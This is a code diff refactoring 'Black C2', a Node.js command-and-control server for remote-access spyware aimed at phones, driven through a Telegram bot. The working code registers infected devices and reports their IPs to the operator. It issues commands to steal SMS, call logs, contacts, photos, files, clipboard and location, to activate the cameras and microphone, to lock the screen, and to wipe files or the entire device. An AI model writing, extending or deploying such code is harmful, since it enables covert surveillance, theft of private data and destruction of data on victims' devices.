@@ -1,5 +1,4 @@
 // language: JavaScript (Node.js), file: server.js, runtime: Node.js 16+
-// dependencies: express, http, socket.io, node-telegram-bot-api, multer, fs
 
 const express = require('express');
 const http = require('http');
@@ -8,21 +7,16 @@ const TelegramBot = require('node-telegram-bot-api');
 const multer = require('multer');
 const fs = require('fs');
 
-// Load configuration
 const config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
 
-// Initialize Express and HTTP server
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: '*' } });
 
-// Initialize Telegram Bot (بدون polling عشان نستخدم webhook)
+// نستخدم bot بدون polling
 const bot = new TelegramBot(config.token);
 
-// In-memory storage for connected devices
-const devices = new Map();
-
-// --- Multer setup for file uploads ---
+// --- Multer setup ---
 const uploader = multer({ dest: 'uploads/' });
 if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');
 
@@ -32,11 +26,7 @@ app.use(express.urlencoded({ extended: true }));
 
 // --- Helper: Escape HTML ---
 function escapeHtml(str) {
-    return String(str)
-        .replace(/&/g, '&amp;')
-        .replace(/</g, '&lt;')
-        .replace(/>/g, '&gt;')
-        .replace(/"/g, '&quot;');
+    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
 }
 
 // --- Helper: Get active device ---
@@ -45,11 +35,10 @@ function getDeviceSocket(deviceId) {
     return devices.values().next().value;
 }
 
-// --- Routes ---
+const devices = new Map();
 
-app.get('/', (req, res) => {
-    res.send('Black C2 Server is running.');
-});
+// --- Routes ---
+app.get('/', (req, res) => res.send('Black C2 Server is running.'));
 
 app.post('/upload', uploader.single('file'), (req, res) => {
     const { originalname, path: filePath } = req.file;
@@ -61,25 +50,18 @@ app.post('/upload', uploader.single('file'), (req, res) => {
     res.send('Done');
 });
 
-// --- Socket.IO: Device Connection & Control ---
-
+// --- Socket.IO ---
 io.on('connection', (socket) => {
     const deviceId = socket.handshake.query.id || `device-${Date.now()}`;
     socket.deviceId = deviceId;
     socket.deviceIp = socket.handshake.address;
     devices.set(deviceId, socket);
 
-    bot.sendMessage(config.id, 
-        `✯ جهاز جديد متصل\n📱 ID: ${escapeHtml(deviceId)}\n🌐 IP: ${escapeHtml(socket.deviceIp)}\n\n📊 إجمالي الأجهزة: ${devices.size}`,
-        { parse_mode: 'HTML' }
-    );
+    bot.sendMessage(config.id, `✯ جهاز جديد متصل\n📱 ID: ${escapeHtml(deviceId)}\n🌐 IP: ${escapeHtml(socket.deviceIp)}\n\n📊 إجمالي الأجهزة: ${devices.size}`, { parse_mode: 'HTML' });
 
     socket.on('disconnect', () => {
         devices.delete(deviceId);
-        bot.sendMessage(config.id, 
-            `✯ الجهاز انفصل\n📱 ID: ${escapeHtml(deviceId)}\n📊 إجمالي الأجهزة: ${devices.size}`,
-            { parse_mode: 'HTML' }
-        );
+        bot.sendMessage(config.id, `✯ الجهاز انفصل\n📱 ID: ${escapeHtml(deviceId)}\n📊 إجمالي الأجهزة: ${devices.size}`, { parse_mode: 'HTML' });
     });
 
     socket.on('data', (data) => {
@@ -95,15 +77,22 @@ io.on('connection', (socket) => {
 
     socket.on('location', (data) => {
         const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
-        bot.sendMessage(config.id, 
-            `📍 موقع الجهاز ${escapeHtml(deviceId)}\n\n🌍 خط العرض: ${data.lat}\n🌍 خط الطول: ${data.lon}\n\n🗺 الخريطة: ${mapLink}`,
-            { parse_mode: 'HTML' }
-        );
+        bot.sendMessage(config.id, `📍 موقع الجهاز ${escapeHtml(deviceId)}\n\n🌍 خط العرض: ${data.lat}\n🌍 خط الطول: ${data.lon}\n\n🗺 الخريطة: ${mapLink}`, { parse_mode: 'HTML' });
     });
 });
 
-// --- Telegram Bot: Main Menu ---
+// --- Telegram Bot: Webhook ---
+const webhookPath = `/bot${config.token}`;
+app.use(bot.webhookCallback(webhookPath));
 
+const webhookUrl = `${config.host}${webhookPath}`;
+bot.setWebHook(webhookUrl).then(() => {
+    console.log(`Webhook set to: ${webhookUrl}`);
+}).catch((err) => {
+    console.error(`Webhook error: ${err.message}`);
+});
+
+// --- Main Menu ---
 function showMainMenu(chatId) {
     const keyboard = [
         [{ text: '📱 معلومات الجهاز', callback_data: 'info' }],
@@ -127,16 +116,11 @@ function showMainMenu(chatId) {
     bot.sendMessage(chatId, '✯ لوحة التحكم:', { reply_markup: { inline_keyboard: keyboard } });
 }
 
+// --- Bot Commands ---
 bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    if (chatId !== config.id) return;
-    bot.sendMessage(chatId, 
-        `✯ أهلاً بك في بوت Black C2\n` +
-        `تم تطويره بواسطة: المطورة رزان (@a_yrj)\n\n` +
-        `📊 الأجهزة المتصلة: ${devices.size}`,
-        { parse_mode: 'HTML' }
-    );
-    showMainMenu(chatId);
+    if (msg.chat.id !== config.id) return;
+    bot.sendMessage(msg.chat.id, `✯ أهلاً بك في بوت Black C2\nتم تطويره بواسطة: المطورة رزان (@a_yrj)\n\n📊 الأجهزة المتصلة: ${devices.size}`, { parse_mode: 'HTML' });
+    showMainMenu(msg.chat.id);
 });
 
 bot.onText(/\/menu/, (msg) => {
@@ -145,42 +129,21 @@ bot.onText(/\/menu/, (msg) => {
 });
 
 bot.onText(/\/devices/, (msg) => {
-    const chatId = msg.chat.id;
-    if (chatId !== config.id) return;
-    if (devices.size === 0) {
-        bot.sendMessage(chatId, '⚠️ لا توجد أجهزة متصلة حالياً.');
-        return;
-    }
+    if (msg.chat.id !== config.id) return;
+    if (devices.size === 0) return bot.sendMessage(msg.chat.id, '⚠️ لا توجد أجهزة متصلة حالياً.');
     let text = `✯ الأجهزة المتصلة (${devices.size}):\n\n`;
     let i = 1;
-    for (const [id, socket] of devices) {
-        text += `${i++}. ${escapeHtml(id)}\n   IP: ${escapeHtml(socket.deviceIp)}\n\n`;
-    }
-    bot.sendMessage(chatId, text, { parse_mode: 'HTML' });
+    for (const [id, socket] of devices) text += `${i++}. ${escapeHtml(id)}\n   IP: ${escapeHtml(socket.deviceIp)}\n\n`;
+    bot.sendMessage(msg.chat.id, text, { parse_mode: 'HTML' });
 });
 
-// --- Callback Query Handler ---
-
+// --- Callback Handler ---
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     if (chatId !== config.id) return bot.answerCallbackQuery(query.id);
 
     const action = query.data;
     const socket = getDeviceSocket();
-
-    if (!socket) return bot.answerCallbackQuery(query.id, { text: '⚠️ لا يوجد جهاز متصل.' });
-
-    const commandMap = {
-        'info': 'info', 'calls': 'get_calls', 'sms': 'get_sms', 'contacts': 'get_contacts',
-        'photos': 'get_photos', 'videos': 'get_videos', 'files': 'get_files', 'apps': 'get_apps',
-        'location': 'get_location', 'network': 'get_network', 'battery': 'get_battery',
-        'sensors': 'get_sensors', 'clipboard': 'get_clipboard', 'cam_front': 'camera_front',
-        'cam_back': 'camera_back', 'flash_on': 'flash_on', 'flash_off': 'flash_off',
-        'vib_on': 'vibrate_on', 'vib_off': 'vibrate_off', 'vol_up': 'volume_up', 'vol_mute': 'volume_mute',
-        'bright_up': 'brightness_up', 'bright_down': 'brightness_down', 'screenshot': 'screenshot',
-        'mic': 'record_audio', 'settings': 'open_settings', 'wifi': 'open_wifi', 'lock': 'lock_screen',
-        'wipe_files': 'wipe_files'
-    };
 
     if (action === 'refresh') {
         bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
@@ -196,7 +159,7 @@ bot.on('callback_query', (query) => {
     }
 
     if (action === 'confirm_wipe') {
-        socket.emit('command', { request: 'wipe_device' });
+        if (socket) socket.emit('command', { request: 'wipe_device' });
         bot.sendMessage(chatId, '💥 جاري إرسال أمر الفرمتة...');
         return bot.answerCallbackQuery(query.id, { text: '✅ تم.' });
     }
@@ -205,6 +168,20 @@ bot.on('callback_query', (query) => {
         bot.sendMessage(chatId, '❌ تم الإلغاء.');
         return bot.answerCallbackQuery(query.id);
     }
+
+    if (!socket) return bot.answerCallbackQuery(query.id, { text: '⚠️ لا يوجد جهاز متصل.' });
+
+    const commandMap = {
+        'info': 'info', 'calls': 'get_calls', 'sms': 'get_sms', 'contacts': 'get_contacts',
+        'photos': 'get_photos', 'videos': 'get_videos', 'files': 'get_files', 'apps': 'get_apps',
+        'location': 'get_location', 'network': 'get_network', 'battery': 'get_battery',
+        'sensors': 'get_sensors', 'clipboard': 'get_clipboard', 'cam_front': 'camera_front',
+        'cam_back': 'camera_back', 'flash_on': 'flash_on', 'flash_off': 'flash_off',
+        'vib_on': 'vibrate_on', 'vib_off': 'vibrate_off', 'vol_up': 'volume_up', 'vol_mute': 'volume_mute',
+        'bright_up': 'brightness_up', 'bright_down': 'brightness_down', 'screenshot': 'screenshot',
+        'mic': 'record_audio', 'settings': 'open_settings', 'wifi': 'open_wifi', 'lock': 'lock_screen',
+        'wipe_files': 'wipe_files'
+    };
 
     const cmd = commandMap[action];
     if (cmd) {
@@ -215,18 +192,6 @@ bot.on('callback_query', (query) => {
     }
 });
 
-// --- Webhook Setup ---
-const webhookUrl = `${config.host}/bot${config.token}`;
-app.use(bot.webhookCallback(`/bot${config.token}`));
-bot.setWebHook(webhookUrl).then(() => {
-    console.log(`Webhook set successfully to: ${webhookUrl}`);
-}).catch((err) => {
-    console.error(`Webhook error: ${err.message}`);
-});
-
 // --- Start Server ---
-
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`Black C2 server is running on port ${PORT}`);
-});
+server.listen(PORT, () => console.log(`Black C2 server is running on port ${PORT}`));
